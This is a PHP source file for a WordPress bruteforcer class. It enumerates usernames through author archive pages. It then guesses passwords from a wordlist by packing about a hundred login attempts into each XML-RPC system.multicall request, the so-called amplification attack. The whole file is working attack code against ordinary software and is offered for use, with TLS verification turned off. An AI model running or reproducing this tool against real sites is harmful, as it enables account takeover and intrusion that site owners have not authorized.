<?php

namespace Arall\WPBruteforcer;

use \Curl\Curl;

/**
 * WordPress Bruteforcer class.
 * Performs a XMLRPC amplification bruteforce using a wordlist.
 * Can also try to enumerate WordPress users.
 *
 * https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html
 *
 * @author Gerard Arall <gerard.arall@gmail.com>
 */
class WPBruteforcer
{
    /**
     * Website URL.
     *
     * @var string
     */
    private $url;

    /**
     * Wordlist path.
     *
     * @var string
     */
    private $wordlist;

    /**
     * XMLRPC URL URI.
     *
     * @var string
     */
    private $xmlrpc_uri = '/xmlrpc.php';

    /**
     * Login tries per request.
     *
     * @var int
     */
    private $tries = 100;

    /**
     * XML Test body.
     */
    const XML_TEST = '<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>demo.sayHello</methodName>
      <params></params>
    </methodCall>';

    /**
     * XML Header.
     */
    const XML_HEADER = '<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
       <methodName>system.multicall</methodName>
       <params><param><value><array><data><value>';

    /**
     * XML Login data.
     */
    const XML_LOGIN = '<struct>
      <member><name>methodName</name>
        <value><string>wp.getAuthors</string></value>
      </member>
      <member>
        <name>params</name>
        <value><array><data>
          <value><string>1</string></value>
          <value><string>USERNAME</string></value>
          <value><string>PASSWORD</string></value>
       </data></array></value>
      </member>
    </struct>';

    /**
     * XML Footer.
     */
    const XML_FOOTER = '</value></data></array></value></param></params>
    </methodCall>';

    /**
     * Set a URL as target.
     *
     * @param string $url
     */
    public function setUrl($url)
    {
        $this->url = $url;
    }

    /**
     * Set nº of tries per request.
     *
     * @param int $tries
     */
    public function setTries($tries)
    {
        $this->tries = $tries;
    }

    /**
     * Set target URI.
     *
     * @param string $uri
     */
    public function setXmlrpcUri($uri)
    {
        $this->xmlrpc_uri = $uri;
    }

    /**
     * Set the wordlist path.
     *
     * @param string $wordlist
     */
    public function setWordlist($wordlist)
    {
        $this->wordlist = $wordlist;
    }

    /**
     * Enumerate users using WP authors pages.
     *
     * @param int $max Limit
     *
     * @return array Array of usernames
     */
    public function enumerate($max = null)
    {
        $users = [];
        $user_id = 0;
        do {
            $user_id++;
            if ($author = $this->getAuthor($user_id)) {
                $users[] = $author;
            }
            if ($max && $user_id >= $max) {
                $author = null;
            }
        } while ($author);

        return $users;
    }

    /**
     * Bruteforce a user using XMLRPC amplification.
     *
     * @param string $username
     *
     * @return string|bool Password or false
     */
    public function bruteforce($username)
    {
        if (!$this->url) {
            return false;
        }

        // Bruteforce
        $passwords = [];
        $lines = 0;
        $handle = fopen($this->wordlist, "r");
        if ($handle) {
            while (($line = fgets($handle)) !== false) {
                $passwords[] = $line;
                $lines++;

                // Perform the request once the max tries are reached
                if ($lines >= $this->tries) {
                    $payload = $this->buildPayload($username, $passwords);
                    $response = $this->xmlrpcRequest($payload);
                    if ($password = $this->checkResponse($response, $passwords)) {
                        return $password;
                    }

                    $passwords = [];
                    $lines = 0;
                }
            }
            fclose($handle);
        }

        return false;
    }

    /**
     * Get the username from an author (user) Id.
     *
     * @param string $user_id
     *
     * @return string|bool Username or false
     */
    private function getAuthor($user_id)
    {
        if ($response = $this->request('/?author=' . $user_id)) {
            preg_match('/archive author author-(.*) author-/', $response, $matches);
            if (isset($matches[1])) {
                return $matches[1];
            }
        }

        return false;
    }

    /**
     * Looks for a password in a XMLRPC response.
     *
     * @param \SimpleXMLElement $response
     * @param array             $passwords Passwords used in the request
     *
     * @return string|bool Password or false
     */
    private function checkResponse($response, $passwords)
    {
        // Check response
        if (isset($response->params->param->value->array->data)) {
            $pos = 0;
            foreach ($response->params->param->value->array->data->value as $value) {
                if (isset($value->array)) {
                    return $passwords[$pos];
                }
                $pos++;
            }
        }

        return false;
    }

    /**
     * Builds a XML payload to perform the bruteforce.
     *
     * @param string $username
     * @param array  $passwords Passwords used in the request
     *
     * @return string
     */
    private function buildPayload($username, array $passwords)
    {
        $payload = self::XML_HEADER;
        foreach ($passwords as $password) {
            $payload .= $this->buildLogin($username, $password);
        }
        $payload .= self::XML_FOOTER;

        return $payload;
    }

    /**
     * Test if the URL has XMLRPC up and running.
     *
     * @return bool
     */
    public function testXMLRPC()
    {
        $response = $this->xmlrpcRequest(self::XML_TEST);

        return isset($response->params->param->value->string) && $response->params->param->value->string == 'Hello!';
    }

    /**
     * Builds a single login attempt for the XML payload.
     *
     * @param string $username
     * @param string $password
     *
     * @return string
     */
    private function buildLogin($username, $password)
    {
        $login = str_replace('USERNAME', $username, self::XML_LOGIN);
        $login = str_replace('PASSWORD', $password, $login);

        return $login;
    }

    /**
     * Performs a XMLRPC request.
     *
     * @param string $data
     *
     * @return \SimpleXMLElement|bool Parsed Response or false
     */
    private function xmlrpcRequest($data)
    {
        if ($response = $this->request($this->xmlrpc_uri, $data)) {
            return $response;
        }

        return false;
    }

    /**
     * Performs a cURL request to the website.
     *
     * @param string       $uri
     * @param string|array $post_data
     *
     * @return string|bool Response or false
     */
    private function request($uri, $post_data = null)
    {
        $url = $this->url . $uri;

        $curl = new Curl();
        $curl->setOpt(CURLOPT_SSL_VERIFYPEER, false);
        $curl->setOpt(CURLOPT_FOLLOWLOCATION, true);

        if ($post_data === null) {
            $curl->get($url);
        } else {
            $curl->post($url, $post_data);
        }

        if (!$curl->error) {
            return $curl->response;
        }

        return false;
    }
}
